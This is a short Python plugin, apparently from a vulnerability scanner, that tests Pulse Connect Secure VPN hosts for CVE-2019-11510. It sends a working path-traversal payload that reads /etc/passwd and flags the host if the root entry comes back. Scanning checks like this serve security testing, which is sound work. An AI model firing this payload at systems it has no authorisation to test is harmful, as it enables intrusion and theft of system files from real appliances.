# coding=utf-8
from lib.Requests import Requests
from lib.verify import verify

vuln = ['Pulse-VPN']


def check(url, ip, ports, apps):
    req = Requests()
    if verify(vuln, ports, apps):
        payload = r"/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/"
        try:
            r = req.get(url + payload)
            if 'root:x:0:0:root' in r.text:
                return 'CVE-2019-11510 Pulse Connect Secure File | ' + url
        except Exception as e:
            pass
